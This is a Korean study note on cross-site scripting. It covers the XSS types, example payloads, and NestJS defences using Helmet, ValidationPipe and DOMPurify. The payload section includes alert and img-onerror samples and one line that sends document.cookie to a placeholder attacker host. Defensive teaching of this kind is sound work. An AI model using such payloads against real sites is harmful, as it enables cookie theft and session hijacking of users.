# XSS (Cross-Site Scripting)

## XSS란?
공격자가 웹 애플리케이션에 악성 스크립트를 삽입하여, 다른 사용자의 브라우저에서 실행되게 하는 취약점.  
주로 사용자 입력 값 검증 미흡에서 발생, 쿠키 탈취, 세션 하이재킹, 피싱 등으로 이어질 수 있음.

## XSS 유형
1. Stored XSS (저장형)
- 악성 스크립트가 DB 등에 영구적으로 저장, 해당 데이터가 다른 사용자에게 제공될 때 실행.
- 예시: 게시판 글, 댓글에 `<script>alert(1)</script>` 삽입.

2. Reflected XSS (반사형)
- URL 쿼리 파라미터, 요청 값에 포함된 스크립트가 즉시 반영되어 실행.
- 예시: `https://example.com/search?q=<script>alert(1)</script>`

3. DOME-based XSS
- 서버 응답이 아닌, 클라리언트 측 자바스크립트(DOM 조작)로 인해 발생.
- 예시: `innerHTML` 사용 시 사용자 입력이 스크립트로 실행.

## 공격 패턴 예시

```html
<!-- 1. 단순 alert -->
<script>alert('XSS')</script>

<!-- 2. 이미지 onerror 이벤트 -->
<img src="x" onerror="alert('XSS')" />


<!-- 3. 쿠키 탈취 -->
<script>fetch('https://attacker.com?c=' + document.cookie)</script>

<!-- 4. DOM 기반 -->
<input id="search" value="<script>alert(1)</script>">
<script>
  document.body.innerHTML = location.hash.substring(1);
</script>
```

## 방어 방법

### 1. 입력 값 검증, 필터링
### 2. 출력 시 Escape
### 3. CSP (Conten Security Policy) 설정
### 4. HttpOnly 쿠기 설정

## NestJS에서 XSS 방어

### 1. Helmet 미들웨어
```typescript
// main.ts
import { NestFactory } from '@nestjs/core';
import { AppModule } from './app.module';
import helmet from 'helmet';

async function bootstrap() {
  const app = await NestFactory.create(AppModule);

  // HTTP 보안 헤더 적용해주는 미들웨어 (CSP 포함 가능)
  app.use(helmet());

  await app.listen(3000);
}
bootstrap();
```

### 2. ValidationPipe + class-validator
```typescript
import { IsString, Length } from 'class-validator';

export class CreateCommentDto {
  @IsString()
  @Length(1, 200)
  content: string;
}
```

```typescript
// main.ts
import { ValidationPipe } from '@nestjs/common';

app.useGlobalPipes(new ValidationPipe({
  whitelist: true,              // DTO에 정의되지 않은 값 제거
  forbidNonWhitelisted: true,   // DTO에 정의되지 않은 값이 들어오면 예외 발생
  transform: true,              // 요청 객체를 DTO 클래스 인스턴스로 자동 변환
                                // { "id": "123" } 요청, dto.id는 number(123)
}));
```

### 3. HTML Sanitizer
```javascript
import * as DOMPurify from 'isomorphic-dompurify';

const safe = DOMPurify.sanitize('<img src=x onerror=alert(1)>');
console.log(safe); // <img src="x">
```

```typescript
import { Injectable } from '@nestjs/common';
import * as DOMPurify from 'isomorphic-dompurify';

@Injectable()
export class CommentService {
  sanitizeInput(input: string): string {
    return DOMPurify.sanitize(input);
  }
}
```